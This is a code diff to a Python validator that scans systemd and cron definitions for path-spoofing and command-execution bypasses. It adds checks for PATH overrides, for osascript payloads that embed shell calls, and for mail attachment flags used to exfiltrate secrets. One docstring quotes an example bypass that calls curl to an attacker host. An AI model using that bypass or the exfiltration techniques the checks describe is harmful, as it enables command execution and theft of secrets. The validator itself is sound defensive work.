@@ -111,11 +111,16 @@ SYSTEMD_EXEC_RE = re.compile(
 
 # systemd timer `Unit=` directive (paired service resolution).
 SYSTEMD_UNIT_RE = re.compile(r"^\s*Unit\s*=\s*(\S+)\s*$", re.MULTILINE)
-# PR71 R2-002 (P1) adopt: ExecSearchPath= directive — systemd uses this to resolve bare
-# commands in Exec*=; presence on a drill service is a path-spoofing risk because allowlist
-# heads like `slack-cli` would be searched in attacker-controlled paths.
+# PR71 R2-002 (P1) + R5-003 (P1) adopt: PATH override directives that affect Exec*= command
+# resolution. systemd.exec(5) documents that Environment=PATH, EnvironmentFile loading PATH,
+# and PassEnvironment of PATH all override the default PATH used to find bare-name commands.
+# Treat any of these as path-spoofing risk on drill services (fail-closed).
 SYSTEMD_EXEC_SEARCH_PATH_RE = re.compile(
     r"^\s*ExecSearchPath\s*=", re.MULTILINE
+)
+SYSTEMD_PATH_OVERRIDE_RE = re.compile(
+    r"^\s*(Environment\s*=\s*PATH\s*=|EnvironmentFile\s*=|PassEnvironment\s*=\s*[^\n]*\bPATH\b)",
+    re.MULTILINE,
 )
 # PR71 R2-005 + R4-001 adopt: systemd Exec*= value can carry leading prefix characters
 # `-` ignore-failure, `+` privileged, `:` no env expansion, `!` user override, `!!` legacy,
@@ -236,15 +241,16 @@ def _check_path_spoofing(cmd_head: str) -> tuple[str | None, str | None]:
 
 
 def _check_osascript_payload(tokens: list[str]) -> tuple[str | None, str | None]:
-    """PR71 R4-005 (P1) adopt: constrain osascript `-e` argument to display notification only.
+    """PR71 R4-005 + R5-002 (P1) adopt: constrain osascript `-e` to safe notification only.
 
-    `osascript -e 'do shell script "..."'` allows arbitrary shell execution, reopening the
-    same destructive-webhook bypass the SOP excludes for `curl`. Require `-e <script>` where
-    the script begins with `display notification` (whitespace flexible).
+    R4-005: require `-e <script>` where the script begins with `display notification`.
+    R5-002: AppleScript can embed `do shell script "..."` inside `display notification` body
+    (e.g., `display notification (do shell script "curl https://attacker.example")`) and
+    AppleScript still evaluates the inner shell call. Reject any `-e` payload that contains
+    `do shell script` token anywhere in the script body.
     """
     if not tokens or tokens[0].rsplit("/", 1)[-1] != "osascript":
         return (None, None)
-    # find -e <script> pair; reject if any -e script is not a `display notification` form
     i = 1
     saw_dash_e = False
     while i < len(tokens):
@@ -253,15 +259,39 @@ def _check_osascript_payload(tokens: list[str]) -> tuple[str | None, str | None]
             if i + 1 >= len(tokens):
                 return ("osascript_payload_invalid", "missing_script_argument")
             script = tokens[i + 1].strip()
-            # accept only `display notification ...` (case-insensitive, leading whitespace OK)
             if not re.match(r"^\s*display\s+notification\b", script, re.IGNORECASE):
                 return ("osascript_payload_unsafe", f"script_not_display_notification={script[:60]}")
+            # R5-002 (P1) adopt: reject embedded `do shell script` or `system attribute` /
+            # `system events` / similar shell-execution AppleScript verbs.
+            if re.search(
+                r"\b(do\s+shell\s+script|system\s+attribute|tell\s+application\s+\"System\s+Events\")\b",
+                script,
+                re.IGNORECASE,
+            ):
+                return (
+                    "osascript_payload_unsafe",
+                    f"script_contains_shell_execution_verb={script[:60]}",
+                )
             i += 2
         else:
             i += 1
     if not saw_dash_e:
-        # `osascript path/to/script.scpt` allows file execution; require -e display notification
         return ("osascript_payload_invalid", "missing_dash_e_flag")
+    return (None, None)
+
+
+def _check_mail_attachment(tokens: list[str]) -> tuple[str | None, str | None]:
+    """PR71 R5-005 adopt: `mail -A <secret_file>` attachment flag exfiltrates secrets without
+    shell `<` redirect. Reject any allowlisted mail/sendmail invocation with -A/--attach.
+    """
+    if not tokens:
+        return (None, None)
+    head = tokens[0].rsplit("/", 1)[-1]
+    if head not in ("mail", "sendmail"):
+        return (None, None)
+    for tok in tokens[1:]:
+        if tok in ("-A", "--attach") or tok.startswith("--attach="):
+            return ("mail_attachment_forbidden", f"mail_attachment_flag={tok[:40]}")
     return (None, None)
 
 
@@ -297,8 +327,12 @@ def _check_command(cmd_line: str) -> tuple[str | None, str | None]:
     head_basename = cmd_head.rsplit("/", 1)[-1]
     if head_basename not in ALLOWLIST_HEADS:
         return ("unknown_command", head_basename)
-    # 6. PR71 R4-005 (P1) adopt: osascript-specific `-e` payload validation
+    # 6. PR71 R4-005 + R5-002 (P1) adopt: osascript-specific `-e` payload validation
     reason, label = _check_osascript_payload(tokens)
+    if reason is not None:
+        return (reason, label)
+    # 7. PR71 R5-005 adopt: mail/sendmail attachment flag check (secret exfiltration)
+    reason, label = _check_mail_attachment(tokens)
     if reason is not None:
         return (reason, label)
     return (None, None)
@@ -348,6 +382,14 @@ def check_systemd_files(scan_files: list[Path] | None, root: Path) -> list[str]:
                         timer_files.append(timer_path)
                         if changed_svc not in service_files:
                             service_files.append(changed_svc)
+                        # PR71 R5-001 (P1) adopt: scan paired non-drill service の drop-in
+                        # `<service>.service.d/*.conf` も含める (changed_dropins から拾えない場合
+                        # でも repo 全 drop-in scan で発見できるよう、baseline glob で resolve)。
+                        dropin_dir = changed_svc.parent / f"{changed_svc.name}.d"
+                        if dropin_dir.exists():
+                            for conf in dropin_dir.glob("*.conf"):
+                                if conf not in service_files:
+                                    service_files.append(conf)
         # PR71 R1-005 adopt: diff-gate で deleted `.service` の paired-missing check
         # changed list 内に deleted `.service` (exists() false) があれば、同名 / 関連 `.timer`
         # を repo baseline から探して `timer_files` に load し、paired-service-missing で
@@ -403,6 +445,15 @@ def check_systemd_files(scan_files: list[Path] | None, root: Path) -> list[str]:
             violations.append(
                 f"VIOLATION reason_code=framework_intake_violation_drill_timer_alert_only_exec_search_path "
                 f"evidence={spath}:{line_num} directive=ExecSearchPath label=path_spoofing_via_search_path"
+            )
+        # PR71 R5-003 (P1) adopt: Environment=PATH= / EnvironmentFile= / PassEnvironment=PATH
+        # also overrides bare-name Exec*= resolution → fail-closed
+        for po_match in SYSTEMD_PATH_OVERRIDE_RE.finditer(content):
+            line_num = content[: po_match.start()].count("\n") + 1
+            violations.append(
+                f"VIOLATION reason_code=framework_intake_violation_drill_timer_alert_only_path_override_env "
+                f"evidence={spath}:{line_num} directive=Environment/EnvironmentFile/PassEnvironment "
+                f"label=path_spoofing_via_systemd_env"
             )
         for match in SYSTEMD_EXEC_RE.finditer(content):
             directive = match.group(1)
@@ -485,7 +536,15 @@ def check_cron_files(scan_files: list[Path] | None, root: Path) -> list[str]:
                 continue
             # 5-field or 6-field
             tokens_count = len(raw_line.split(None, 6))
-            if is_etc_crond and tokens_count >= 7:
+            if is_etc_crond:
+                # PR71 R5-004 adopt: cron.d は user field + command が必須、
+                # 6 tokens のみ (5 schedule + user、command 不在) は fail-closed
+                if tokens_count < 7:
+                    violations.append(
+                        f"VIOLATION reason_code=framework_intake_violation_drill_timer_alert_only_cron_parse_failed "
+                        f"evidence={path}:{line_num} label=cron_d_user_or_command_missing line={raw_line[:80]}"
+                    )
+                    continue
                 # 6-field: parse 5 schedule fields + user + command
                 six = CRON_SIX_FIELD_RE.match(raw_line)
                 if six:
